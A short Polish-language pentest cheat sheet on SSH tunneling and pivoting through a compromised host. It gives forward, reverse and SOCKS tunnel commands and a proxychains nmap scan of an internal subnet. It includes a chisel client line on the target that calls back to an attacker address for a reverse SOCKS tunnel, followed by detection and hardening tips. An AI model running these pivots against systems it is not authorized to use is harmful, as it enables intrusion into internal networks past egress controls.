---
title: "SSH Tunneling & Pivoting"
category: "networking"
tags: ["networking", "pivoting", "ssh"]
platform: "agnostic"
mitre: ["T1572"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# SSH Tunneling & Pivoting

## TL;DR
Przez przejęty host docierasz do sieci wewnętrznej. SSH oferuje 3 tryby: local (-L), remote (-R), dynamic/SOCKS (-D). Do złożonych sieci: chisel/ligolo-ng.

## SSH forwarding
```bash
# Local (-L): lokalny port -> usługa widziana przez jump host
ssh -L 8080:10.0.0.5:80 user@jump      # localhost:8080 -> wewnętrzny 10.0.0.5:80

# Remote (-R): wystaw swój port na zdalnym (reverse)
ssh -R 4444:localhost:4444 user@jump   # jump:4444 -> Twój localhost:4444

# Dynamic (-D): SOCKS proxy -> cała podsieć przez jump
ssh -D 1080 user@jump
# potem: proxychains nmap -sT 10.0.0.0/24
```

## proxychains
```text
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
proxychains curl http://10.0.0.5
```

## Nowoczesne pivoting (bez SSH na celu)
```bash
# chisel – reverse SOCKS przez HTTP
# atakujący:
chisel server -p 8000 --reverse
# na celu:
chisel client 10.10.14.1:8000 R:socks

# ligolo-ng – interfejs tun, wygodny do całych podsieci
ligolo-proxy -selfcert         # atakujący
# agent na celu -> add route do wewnętrznej podsieci
```

## Wykrywanie (Blue Team)
- Reverse połączenia wychodzące (long-lived), SSH -R, nietypowe SOCKS/tun.
- Host wewnętrzny inicjujący outbound do internetu na nietypowych portach.

## Mitygacja / Hardening
- Egress filtering, segmentacja, blokada `AllowTcpForwarding` gdzie zbędne.
- Monitoring długich sesji i tuneli; jump hosty tylko przez bastion z audytem.

## Źródła
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) · [chisel](https://github.com/jpillora/chisel)
